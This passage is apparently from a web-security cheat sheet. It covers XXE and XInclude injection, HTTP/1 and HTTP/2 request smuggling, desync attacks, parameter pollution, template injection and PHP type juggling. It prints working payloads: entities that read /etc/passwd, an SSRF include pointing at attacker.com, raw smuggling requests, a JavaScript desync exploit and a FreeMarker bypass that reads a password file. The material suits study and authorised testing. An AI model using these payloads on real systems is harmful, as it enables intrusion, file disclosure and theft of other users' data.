When the attacker has no control of the whole document, i.e. can't define the DOCTYPE, but controls at least a single item that gets included in a server-side processed XML, it could be possible to exploit the <strong>XInclude</strong> feature</p>
<ul>
<li>XInclude allows an XML document to be built from sub-documents</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;foo</span><span class="w"> </span><span class="na">xmlns:xi=</span><span class="s">"http://www.w3.org/2001/XInclude"</span><span class="nt">&gt;</span><span class="w"> </span><span class="cm">&lt;!-- The namespace must be referenced --&gt;</span>

<span class="cm">&lt;!-- LFI--&gt;</span>
<span class="nt">&lt;xi:include</span><span class="w"> </span><span class="na">parse=</span><span class="s">"text"</span><span class="w"> </span><span class="na">href=</span><span class="s">"file:///etc/passwd"</span><span class="nt">/&gt;&lt;/foo&gt;</span>

<span class="cm">&lt;!-- Or SSRF--&gt;</span>
<span class="nt">&lt;xi:include</span><span class="w"> </span><span class="na">parse=</span><span class="s">"text"</span><span class="w"> </span><span class="na">href=</span><span class="s">"http://attacker.com"</span><span class="nt">/&gt;&lt;/foo&gt;</span>
</code></pre></div>
<p><strong>Note</strong>: the <code>parse</code> attribute can be valued with "text" or "xml" (default "xml"); when including non-XML files, not setting the <code>parse</code> attribute to "text" would trigger an error.</p>
<p><strong>Content Type</strong>
Some hidden XXE surface can be found by forcing the content type header in the request to be <code>text/xml</code>; some web server or application could be processing the XML passed in the body.</p>
<p><strong>Soap Envelope</strong></p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
<span class="cp">&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM "file:///etc/passwd"&gt;</span>]&gt;
<span class="nt">&lt;soapenv:Envelope</span><span class="w"> </span><span class="na">xmlns:soapenv=</span><span class="s">"attacker.net"</span><span class="nt">&gt;</span>
<span class="w">    </span><span class="nt">&lt;soapenv:Header/&gt;</span>
<span class="w">    </span><span class="nt">&lt;soapenv:Body&gt;</span>
<span class="w">            </span><span class="nt">&lt;changeUserPassword&gt;&lt;usermname&gt;</span><span class="ni">&amp;test;</span><span class="nt">&lt;/username&gt;</span>
<span class="w">                </span><span class="nt">&lt;curpwd&gt;</span>abcdef<span class="nt">&lt;/curpwd&gt;</span>
<span class="w">                </span><span class="nt">&lt;newpwd&gt;</span>abedef<span class="nt">&lt;/newpwd&gt;</span>
<span class="w">            </span><span class="nt">&lt;/changeUserPassword&gt;</span>
<span class="w">        </span><span class="nt">&lt;/soapenv:Body&gt;</span>
<span class="w">    </span><span class="nt">&lt;/soapenv:Envelope&gt;</span>
</code></pre></div>
<h2 id="request-smuggling">Request Smuggling</h2>
<h3 id="http11">HTTP/1.1</h3>
<p>Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides two different ways to specify where a request ends: the <code>Content-Length</code> header and the <code>Transfer-Encoding</code> header.</p>
<ul>
<li>The <code>Transfer-Encoding</code> header is used to specify that the request body contains one or more <em>chunks</em>.</li>
<li>Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero.</li>
</ul>
<p>Example of chunk:</p>
<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/search</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">normal-website.com</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>

<span class="nt">b</span>
<span class="nt">q</span><span class="o">=</span><span class="s">smuggling</span>
<span class="s">0</span>
</code></pre></div>
<p>Websites that use <strong>HTTP/2</strong> end-to-end are inherently immune to request smuggling attacks. As the HTTP/2 specification introduces a single, robust mechanism for specifying the length of a request, there is no way for an attacker to introduce the required ambiguity.</p>
<p><strong>The attack</strong>: If the front-end and back-end servers behave differently in relation to the (possibly obfuscated) <code>Transfer-Encoding</code> header, then they might disagree about the boundaries between successive requests, leading to request smuggling vulnerabilities.</p>
<ul>
<li><strong>CL.TE</strong>: the front-end server uses the <code>Content-Length</code> header and the back-end server uses the <code>Transfer-Encoding</code> header. </li>
<li><strong>TE.CL</strong>: the front-end server uses the <code>Transfer-Encoding</code> header and the back-end server uses the <code>Content-Length</code> header.</li>
<li><strong>TE.TE</strong>: the front-end and back-end servers both support the <code>Transfer-Encoding</code> header, but one of the servers can be induced not to process it by obfuscating the header in some way.</li>
</ul>
<p>*<strong>Note</strong>: Smuggled request must contain a body otherwise the back-end server will see the smuggled  and the following requests as two distinct normal requests. Smuggling a request that contains a body implies that the next request on the connection will be appended to it.</p>
<p><strong>CL.TE</strong></p>
<ul>
<li><code>Content-Length</code> value should wrap the whole request.</li>
<li>The chunk in the body of arbitrary size is followed by the content to be smuggled.</li>
</ul>
<p>Example of <strong>CL.TE</strong>:</p>
<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">13</span>
<span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>

<span class="err">0</span>

<span class="err">SMUGGLED</span>
</code></pre></div>
<p><strong>TE.CL</strong></p>
<ul>
<li>The first chunk contains the whole request body and it's followed by a 0-length chunk.</li>
<li>The <code>Content-Length</code> value is set to wrap the body until the first chunk size, leaving the rest of the body unprocessed (smuggled).</li>
<li>The trailing sequence <code>\r\n\r\n</code> following the final <code>0</code> is needed.</li>
</ul>
<p>Example of <strong>TE.CL</strong>:</p>
<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">vulnerable-website.com</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">3 // Note that 3 because of "\r\n" + "8"</span>
<span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>

8
SMUGGLED // There insert an HTTP request well formatted (if post, must contain content-length/transfer-encoding and content-type header)
0
</code></pre></div>
<p>*Note: smuggled content-length must consider the fact that the next request will be included into the body of the smuggled request</p>
<p><strong>TE.TE</strong></p>
<ul>
<li>To uncover a TE.TE vulnerability, it is necessary to find some variation of the <code>Transfer-Encoding</code> header such that only one of the front-end or back-end servers processes it, while the other server ignores it.</li>
<li>The <code>Content-Length</code> value is set to wrap the body until the first chunk size, leaving the rest of the body unprocessed (smuggled).</li>
<li>The trailing sequence <code>\r\n\r\n</code> following the final <code>0</code> is needed.</li>
</ul>
<p>Example of  <code>Transfer-Encoding</code> obfuscation:</p>
<div class="highlight"><pre><span></span><code><span class="n">Transfer</span><span class="o">-</span><span class="nl">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">xchunked</span>

<span class="n">Transfer</span><span class="o">-</span><span class="n">Encoding</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="n">chunked</span>

<span class="n">Transfer</span><span class="o">-</span><span class="nl">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">chunked</span>
<span class="n">Transfer</span><span class="o">-</span><span class="nl">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">x</span>

<span class="n">Transfer</span><span class="o">-</span><span class="nl">Encoding</span><span class="p">:</span><span class="o">[</span><span class="n">tab</span><span class="o">]</span><span class="n">chunked</span>

<span class="o">[</span><span class="n">space</span><span class="o">]</span><span class="n">Transfer</span><span class="o">-</span><span class="nl">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">chunked</span>

<span class="nl">X</span><span class="p">:</span><span class="w"> </span><span class="n">X</span><span class="o">[</span><span class="n">\n</span><span class="o">]</span><span class="n">Transfer</span><span class="o">-</span><span class="nl">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">chunked</span>

<span class="n">Transfer</span><span class="o">-</span><span class="n">Encoding</span>
<span class="err">:</span><span class="w"> </span><span class="n">chunked</span>
</code></pre></div>
<h3 id="http2">HTTP/2</h3>
<p>HTTP/2 messages are sent over the wire as a series of separate "frames". Each frame is preceded by an explicit length field, which tells the server exactly how many bytes to read in. Therefore, the length of the request is the sum of its frame lengths. With this mechanism, there is no way for an attacker to introduce the required ambiguity as long as the website uses HTTP/2 end to end.</p>
<h4 id="http2-downgrading">HTTP/2 downgrading</h4>
<p>As HTTP/2 is still relatively new, web servers that support it often still have to communicate with legacy back-end infrastructure that only speaks HTTP/1:</p>
<ul>
<li><strong>HTTP/2 downgrading</strong>: Many websites have an HTTP/2-speaking front-end server, but deploy this in front of back-end infrastructure that only supports HTTP/1. This means that the front-end effectively has to translate the requests it receives into HTTP/1. When the HTTP/1-speaking back-end issues a response, the front-end server reverses this process to generate the HTTP/2 response that it returns to the client.</li>
</ul>
<p>HTTP/2 don't have to specify their length explicitly in a header; in a downgraded HTTP/2 request to HTTP/1 a <code>Content-Length</code> header is derived from the sum of the lengths of the frames the request is composed by.</p>
<ul>
<li>However, it's possible to explicit the <code>content-length</code> header* in a HTTP/2 request. By specs, it must match the sum of the lengths of the frames but it isn't always validated and the <code>content-legnth</code> <strong>could be used as it is in the downgraded request</strong>, making room for some smuggling attacks (<strong>H2.CL</strong>).</li>
<li>Chunked transfer encoding is incompatible with HTTP/2 and the spec recommends that any <code>transfer-encoding: chunked</code> header you try to inject should be stripped or the request blocked entirely. If the front-end server fails to do this, and subsequently downgrades the request for an HTTP/1 back-end <strong>that does support chunked encoding,</strong> this can also enable request smuggling attacks (<strong>H2.TE</strong>).</li>
<li>Since HTTP/2 messages are binary rather than text-based, the boundaries of each header are based on explicit, predetermined offsets rather than delimiter characters and therefore <code>\r\n</code> can be used as part of an header value. If the front-end server downgrades an HTTP/2 request containing these characters, these will be interpreted as delimiter, leading to an header injection via <strong>CRLF injection</strong>. Useful when previous techniques are being blocked by the front-end server.<ul>
<li>Take a look to <a href="https://portswigger.net/web-security/request-smuggling/advanced/http2-exclusive-vectors">HTTP/2 exclusive vectors</a> for other injectable vectors!</li>
</ul>
</li>
<li><strong>Response queue poisoning</strong> is a form of request smuggling attack that causes a front-end server to start mapping responses from the back-end to the wrong requests.</li>
<li><strong>HTTP/2 Request splitting</strong> is a form of request smuggling attack similar to the <strong>response queue poisoning</strong> where a complete HTTP request is smuggled but, this time, it is smuggled in an HTTP/2 header instead of the body.</li>
<li><strong>HTTP Request Tunneling</strong> is a form of request smuggling attack that is useful when the server doesn't use the same connection for the attacker and the victim. The attack consists into sending a single request that will elicit two responses from the back-end, where the second response is nested into the first response so that the front-end server only sees one request and one response.</li>
</ul>
<p>*Note: HTTP/2 requests's headers are always lowercase</p>
<h5 id="h2cl"><strong>H2.CL</strong></h5>
<ul>
<li>Set <code>content-length</code> to 0.</li>
<li>In the body, pass the whole request to smuggle with a <code>Content-Length</code> a little greater than the effective request body size so that the next request is not processed.</li>
</ul>
<p>Example:</p>
<div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">2</span>
<span class="na">content-type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">content-length</span><span class="o">:</span> <span class="l">0</span>

<span class="err">SMUGGLED</span>
</code></pre></div>
<h5 id="h2te"><strong>H2.TE</strong></h5>
<ul>
<li>Set the header <code>transfer-encoding: chunked</code>.</li>
<li>In the body pass an empty chunk followed by the request to smuggle</li>
</ul>
<p>Example:</p>
<div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">2</span>
<span class="na">content-type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">transfer-encoding</span><span class="o">:</span> <span class="l">chunked</span>

<span class="err">0</span>

<span class="err">SMUGGLED</span>
</code></pre></div>
<h6 id="request-smuggling-via-crlf-injection"><strong>Request Smuggling via CRLF Injection</strong></h6>
<ul>
<li>Inject the <code>Content-Length</code> header or the <code>Transfer-Encoding</code> header in another request header by using <code>\r\n</code> chars.</li>
</ul>
<h5 id="response-queue-poisoning_1"><strong>Response queue poisoning</strong></h5>
<p>*Note: This attack is possible both via classic HTTP/1 request smuggling and by exploiting HTTP/2 downgrading.</p>
<p>Criteria:</p>
<ul>
<li>The TCP connection between the front-end server and back-end server <strong>is reused for multiple request/response cycles</strong>.</li>
<li>The attacker is able to successfully <strong>smuggle a complete, standalone request</strong> that receives its own distinct response from the back-end server.</li>
<li>The attack does not result in either server closing the TCP connection. Servers generally close incoming connections when they receive an invalid request because they can't determine where the request is supposed to end. When performing request smuggling, this typically happens with the "leftovers" of last request to be appended to the smuggled request body that are not included by the smuggled <code>Content-Length</code>; <strong>the remaining part of this request don't form a valid request and therefore causes a connection close</strong>.</li>
</ul>
<p>The key is to smuggle a complete request instead of just a prefix like in the classic smuggling attacks. Once the response queue is poisoned, the attacker can just send an arbitrary request to capture another user's response since the response queue is misaligned due the smuggled complete request.</p>
<p>Example:</p>
<div class="highlight"><pre><span></span><code><span class="nv">POST</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nv">HTTP</span><span class="o">/</span><span class="mi">1</span>.<span class="mi">1</span>\<span class="nv">r</span>\<span class="nv">n</span>
<span class="nv">Host</span>:<span class="w"> </span><span class="nv">vulnerable</span><span class="o">-</span><span class="nv">website</span>.<span class="nv">com</span>\<span class="nv">r</span>\<span class="nv">n</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Type</span>:<span class="w"> </span><span class="nv">x</span><span class="o">-</span><span class="nv">www</span><span class="o">-</span><span class="nv">form</span><span class="o">-</span><span class="nv">urlencoded</span>\<span class="nv">r</span>\<span class="nv">n</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Length</span>:<span class="w"> </span><span class="mi">61</span>\<span class="nv">r</span>\<span class="nv">n</span>
<span class="nv">Transfer</span><span class="o">-</span><span class="nv">Encoding</span>:<span class="w"> </span><span class="nv">chunked</span>\<span class="nv">r</span>\<span class="nv">n</span>
\<span class="nv">r</span>\<span class="nv">n</span>
<span class="mi">0</span>\<span class="nv">r</span>\<span class="nv">n</span>
\<span class="nv">r</span>\<span class="nv">n</span>
<span class="nv">GET</span><span class="w"> </span><span class="o">/</span><span class="nv">anything</span><span class="w"> </span><span class="nv">HTTP</span><span class="o">/</span><span class="mi">1</span>.<span class="mi">1</span>\<span class="nv">r</span>\<span class="nv">n</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="nv">Complete</span><span class="w"> </span><span class="nv">request</span>
<span class="nv">Host</span>:<span class="w"> </span><span class="nv">vulnerable</span><span class="o">-</span><span class="nv">website</span>.<span class="nv">com</span>\<span class="nv">r</span>\<span class="nv">n</span>
\<span class="nv">r</span>\<span class="nv">n</span>
<span class="nv">GET</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nv">HTTP</span><span class="o">/</span><span class="mi">1</span>.<span class="mi">1</span>\<span class="nv">r</span>\<span class="nv">n</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="k">Next</span><span class="w"> </span><span class="nv">request</span><span class="w"> </span><span class="nv">not</span><span class="w"> </span><span class="nv">being</span><span class="w"> </span><span class="nv">broken</span>
<span class="nv">Host</span>:<span class="w"> </span><span class="nv">vulnerable</span><span class="o">-</span><span class="nv">website</span>.<span class="nv">com</span>\<span class="nv">r</span>\<span class="nv">n</span>
\<span class="nv">r</span>\<span class="nv">n</span>
</code></pre></div>
<h5 id="http2-request-splitting"><strong>HTTP/2 request splitting</strong></h5>
<p>When performing a request splitting attack, it's important to take in account the <strong>front-end rewriting</strong>:</p>
<ul>
<li>The front-end server, during the downgrade, may be appending the <code>Host</code> header to the downgraded request last header; because of the request splitting, the downgraded request (the first slice) might not have any host header and, eventually, the smuggled request (the second slice) might result in two <code>Host</code>headers.<ul>
<li>Position the injected <code>Host</code> header so that it ends up in the first request once the split occurs</li>
</ul>
</li>
</ul>
<h5 id="http-request-tunnelling"><strong>HTTP request tunnelling</strong></h5>
<p>Request tunnelling is possible with both HTTP/1 and HTTP/2 but is considerably more difficult to detect in HTTP/1-only environments. </p>
<ul>
<li>Due to the way persistent (keep-alive) connections work in HTTP/1, even if two responses are received, this doesn't necessarily confirm that the request was successfully smuggled</li>
</ul>
<p>Leak internal headers:</p>
<ul>
<li>Inject into an arbitrary HTTP/2 header a <code>Content-Length</code> header via CRLF injection followed by a <code>\r\n\r\n</code> and an incomplete body form field such as <code>exfiltrate=</code><ul>
<li>During downgrade, the front-end server will append internal headers to this field</li>
</ul>
</li>
<li>Tune the <code>Content-Length</code> value</li>
</ul>
<p>A <strong>blind request tunnelling</strong> is when the front-end server only returns the number of bytes specified in the <code>Content-Length</code> of the main response so that the tunnelled request's response is never returned to the attacker.</p>
<p>It's possible to abuse <code>HEAD</code> requests, if supported to force the front-end to over-read the main response, making a blind tunnel not blind.</p>
<ul>
<li>Responses to <code>HEAD</code> requests often contain a <code>content-length</code> header even though they don't have a body of their own. Some front-end servers fail to account for this and attempt to read in the number of bytes specified in the header regardless.</li>
</ul>
<p>Request tunnelling using <code>HEAD</code> method:</p>
<ul>
<li>Inject into an arbitrary HTTP/2 header a complete HTTP request via CRLF injection</li>
<li>Tune the <code>Content-Length</code> value</li>
</ul>
<h3 id="client-side-desync-attacks_2">Client-side Desync Attacks</h3>
<p>A <strong>client-side desync (CSD)</strong> is an attack that makes the victim's web browser desynchronize its own connection to the vulnerable website.</p>
<h4 id="cl0">CL.0</h4>
<p>CL.0 is a type of <strong>desync attack</strong>. If the back-end server can be persuaded to assume that each request finishes at the end of the headers (as if the request has <code>Content-Length: 0</code>), but the front-end still uses the <code>Content-Length</code> header to determine where the request ends, it's possible to exploit this discrepancy for HTTP request smuggling.</p>
<ul>
<li>To probe for CL.0 vulnerabilities, first send a request containing another partial request in its body, then send a normal follow-up request. You can then check to see whether the response to the follow-up request was affected by the smuggled prefix.</li>
</ul>
<p>The backend-server behaviour of not reading a request body is typical for endpoints that aren't expecting <code>POST</code> requests, such as static files or server-level redirects.</p>
<p>For these attacks to work:</p>
<ul>
<li><strong>The target web server must not support HTTP/2.</strong> Client-side desyncs rely on HTTP/1.1 connection reuse, and browsers generally favor HTTP/2 where available.<ul>
<li>or the victim will access the site via a forward proxy that only supports HTTP/1.1. </li>
</ul>
</li>
<li>Some of the endpoints on the target web server responds to <code>POST</code> requests without reading in the body.</li>
<li>The web server allows the browser to reuse the same connection for additional requests.</li>
</ul>
<p><strong>Key concept</strong>: the web server responds to a <code>POST</code> request without reading its body (eventually containing a smuggled request/prefix), leaving it on the server's TCP/TLS socket after it responds to the initial request, desyncing the connection with the browser when next requests arrive.</p>
<p>Attack stages:</p>
<ol>
<li>The victim visits a web page on an arbitrary domain containing malicious JavaScript.</li>
<li>The JavaScript causes the victim's browser to issue a request to the vulnerable website. This contains an attacker-controlled request prefix in its body, much like a normal request smuggling attack.</li>
<li>The malicious prefix is left on the server's TCP/TLS socket after it responds to the initial request, desyncing the connection with the browser.</li>
<li>The JavaScript then triggers a follow-up request <strong>down the poisoned connection</strong> (if using a different connection, the attack will fail). This is appended to the malicious prefix, eliciting a harmful response from the server.</li>
</ol>
<p><strong>Note</strong>: As these attacks don't rely on parsing discrepancies between two servers, this means that even single-server websites may be vulnerable.</p>
<p>To check if the web server is ignoring a <code>POST</code> body:</p>
<ul>
<li>Send a request in which the specified <code>Content-Length</code> is longer than the actual body. If the server responds immediately, it's a potential CSD vector.</li>
</ul>
<p>Most likely candidates are endpoints that aren't expecting <code>POST</code> requests, such as static files or server-level redirects. Alternatively, the same behaviour can be found by triggering a server error.</p>
<p>Javascript exploit code:</p>
<div class="highlight"><pre><span></span><code><span class="nx">fetch</span><span class="p">(</span><span class="s1">'https://&lt;target&gt;'</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">'POST'</span><span class="p">,</span>
<span class="w">        </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="s1">'&lt;gadget request to smuggle&gt;'</span><span class="p">,</span>
<span class="w">        </span><span class="nx">mode</span><span class="o">:</span><span class="w"> </span><span class="s1">'cors'</span><span class="p">,</span><span class="w"> </span><span class="c1">// needed to prevent 302 redirect following</span>
<span class="w">        </span><span class="nx">credentials</span><span class="o">:</span><span class="w"> </span><span class="s1">'include'</span><span class="p">,</span>
<span class="w">    </span><span class="p">}).</span><span class="k">catch</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">'&lt;request to capture&gt;'</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">mode</span><span class="o">:</span><span class="w"> </span><span class="s1">'no-cors'</span><span class="p">,</span>
<span class="w">        </span><span class="nx">credentials</span><span class="o">:</span><span class="w"> </span><span class="s1">'include'</span>
<span class="w">    </span><span class="p">})</span>
<span class="p">})</span>
</code></pre></div>
<h3 id="pause-based-desync-attacks_1">Pause-based desync attacks</h3>
<p>Pause-based desync vulnerabilities can occur when a server times out a request but leaves the connection open for reuse.</p>
<ul>
<li>Servers are commonly configured with a read timeout. If they don't receive any more data for a certain amount of time, they treat the request as complete and issue a response, regardless of how many bytes they were told to expect.</li>
</ul>
<h4 id="server-side-pause-based-desync">Server-side pause-based desync</h4>
<p>Conditions:</p>
<ul>
<li>The front-end server must immediately forward each byte of the request to the back-end rather than waiting until it has received the full request.</li>
<li>The front-end server must not (or can be encouraged not to) time out requests before the back-end server.</li>
<li>The back-end server must leave the connection open for reuse following a read timeout.</li>
</ul>
<p>Flow:</p>
<ol>
<li>The front-end forwards the headers to the back-end, then continues to wait for the remaining bytes promised by the <code>Content-Length</code> header.</li>
<li>After a while, the back-end times out and sends a response, even though it has only consumed part of the request. At this point, the front-end may or may not read in this response and forward it to us.</li>
<li>We finally send the body, which contains a basic request smuggling prefix in this case.</li>
<li>The front-end server treats this as a continuation of the initial request and forwards this to the back-end down the same connection.</li>
<li>The back-end server has already responded to the initial request, so assumes that these bytes are the start of another request.</li>
</ol>
<p>Check <a href="https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync">this</a>for burp usage for testing pause-based desyncs:</p>
<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>
    <span class="n">engine</span> <span class="o">=</span> <span class="n">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="o">.</span><span class="n">endpoint</span><span class="p">,</span>
                           <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="c1"># allow only one connection</span>
                           <span class="n">requestsPerConnection</span><span class="o">=</span><span class="mi">500</span><span class="p">,</span>
                           <span class="n">pipeline</span><span class="o">=</span><span class="kc">False</span>
                           <span class="p">)</span>

    <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="n">target</span><span class="o">.</span><span class="n">req</span><span class="p">,</span> <span class="n">pauseMarker</span><span class="o">=</span><span class="p">[</span><span class="s1">'</span><span class="se">\r\n\r\n</span><span class="s1">'</span><span class="p">],</span> <span class="n">pauseTime</span><span class="o">=</span><span class="mi">61000</span><span class="p">)</span> <span class="c1"># pause for 61 seconds after sending bytes until specified marker</span>
    <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="n">target</span><span class="o">.</span><span class="n">req</span><span class="p">)</span> <span class="c1"># Any followup request</span>

<span class="k">def</span> <span class="nf">handleResponse</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">interesting</span><span class="p">):</span>
    <span class="n">table</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
</code></pre></div>
<h3 id="bypasses_8">Bypasses</h3>
<p>Try adding a <code>\r</code> or a <code></code> before the headers <code>content-length</code> or <code>transfer-encoding</code> to trigger possible disambiguity between frontend and backend server.</p>
<h2 id="server-side-parameter-pollution_1">Server-Side Parameter Pollution</h2>
<p>Server-side parameter pollution occurs when a website embeds user input in a server-side request to an internal API without adequate encoding.</p>
<div class="highlight"><pre><span></span><code><span class="n">Request</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">Front</span><span class="o">-</span><span class="kd">End </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">Back</span><span class="o">-</span><span class="kd">End </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">Internal</span><span class="w"> </span><span class="n">API</span>
</code></pre></div>
<p>To test for server-side parameter pollution in the query string, place query syntax characters in your input and observe how the application responds:</p>
<ul>
<li><code>#</code> (<strong>URL-encoded</strong>): attempt to truncate the server-side request.</li>
<li><code>&amp;</code> (<strong>URL-encoded</strong>): attempt to inject or override existing parameters in the query string.</li>
<li><code>=</code></li>
</ul>
<p>Examples:</p>
<div class="highlight"><pre><span></span><code><span class="c1">// # truncation</span>
<span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">userSearch</span>?<span class="n">name</span><span class="p">=</span><span class="n">peter</span>%<span class="mi">23</span><span class="n">foo</span><span class="o">&amp;</span><span class="n">back</span><span class="p">=</span><span class="o">/</span><span class="no">home</span><span class="w"> </span>

<span class="c1">// Parameter injection with &amp;</span>
<span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">userSearch</span>?<span class="n">name</span><span class="p">=</span><span class="n">peter</span>%<span class="mi">26</span><span class="n">foo</span><span class="p">=</span><span class="n">xyz</span><span class="o">&amp;</span><span class="n">back</span><span class="p">=</span><span class="o">/</span><span class="no">home</span>

<span class="c1">// Parameter overriding with &amp;</span>
<span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">userSearch</span>?<span class="n">name</span><span class="p">=</span><span class="n">peter</span>%<span class="mi">26</span><span class="n">name</span><span class="p">=</span><span class="n">carlos</span><span class="o">&amp;</span><span class="n">back</span><span class="p">=</span><span class="o">/</span><span class="no">home</span>
</code></pre></div>
<p>Note: <strong>the same technique is applicable in POST requests!</strong></p>
<h2 id="template-injection">Template Injection</h2>
<h3 id="server-side-template-injection-ssti">Server-Side Template Injection (SSTI)</h3>
<p><strong>Server-side template injection  (SSTI)</strong> vulnerabilities arise when user input is concatenated into templates rather than being passed in as data. </p>
<p><strong>SSTI</strong> can occur in two contexts:</p>
<ul>
<li><strong>Plaintext Context</strong>: input is reflected in the resulting HTML generated from the template. Example: <code>render('Hello ' + input)</code></li>
<li><strong>Code Context</strong>: input is reflected in a template expression. Example: <code>engine.render("Hello {{"+input+"}}", data)</code></li>
</ul>
<p>To detect SSTI:</p>
<ul>
<li>Try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as <code>${{&lt;%[%'"}}%\</code> to detect if a template engine is being used. If an exception is raised, this indicates that the injected template syntax is potentially being interpreted by the server in some way.</li>
<li>Test if input is reflected in Plaintext Context: try at least these <code>${7*7}</code>, <code>#{7*7}</code>, <code>[=3*3]</code>, <code>&lt;%= 7 * 7 %&gt;</code>, <code>{{7*'7'}}</code> </li>
<li>Test if input is reflected in Code Context: send <code>7*7</code> or try breaking the code context, es: <code>7*7}}&lt;tag&gt;</code></li>
</ul>
<p>Identify the template engine in use:</p>
<p><img alt="ssti-template-engine-identification.png" src="http://localhost:1337/images/web/web-cheatsheet/ssti-template-engine-identification.png"/></p>
<p><strong>Many template engines expose a "self" or "environment" object of some kind, which acts like a namespace containing all objects, methods, and attributes that are supported by the template engine. If such an object exists, you can potentially use it to generate a list of objects that are in scope.</strong></p>
<p>Useful resources:</p>
<ul>
<li>https://portswigger.net/research/server-side-template-injection</li>
</ul>
<h3 id="bypasses_9">Bypasses</h3>
<p>FreeMarker sandbox bypass (path traversal):</p>
<div class="highlight"><pre><span></span><code><span class="n">$</span><span class="p">{</span><span class="n">product</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getProtectionDomain</span><span class="p">().</span><span class="na">getCodeSource</span><span class="p">().</span><span class="na">getLocation</span><span class="p">().</span><span class="na">toURI</span><span class="p">().</span><span class="na">resolve</span><span class="p">(</span><span class="err">'</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">carlos</span><span class="o">/</span><span class="n">my_password</span><span class="p">.</span><span class="na">txt</span><span class="err">'</span><span class="p">).</span><span class="na">toURL</span><span class="p">().</span><span class="na">openStream</span><span class="p">().</span><span class="na">readAllBytes</span><span class="p">()</span><span class="o">?</span><span class="n">join</span><span class="p">(</span><span class="s">" "</span><span class="p">)}</span>
</code></pre></div>
<h2 id="unsafe-deserialization_1">Unsafe Deserialization</h2>
<h3 id="type-juggling">Type Juggling</h3>
<p>PHP does not require explicit type definition in variable declaration. In this case, the type of a variable is determined by the value it stores, by the use of the loose comparison operator <code>==</code>. </p>
<p>An attacker can abuse this behaviour in order to bypass restrictions or elevate privileges:</p>
<div class="highlight"><pre><span></span><code><span class="x">"5" == 5 // True</span>

<span class="x">0 == 0.0 // True</span>

<span class="x">5 == "5 and a string" // True for PHP &lt; 8</span>

<span class="x">0 == "String without numbers" // True for PHP &lt; 8</span>
</code></pre></div>
<p>Note: from PHP 8.0 some loose comparisons are treated differently: <a href="https://www.php.net/manual/en/migration80.incompatible.php">PHP 8.0 Backward Incompatible Changes</a></p>
<h3 id="magic-methods">Magic Methods</h3>
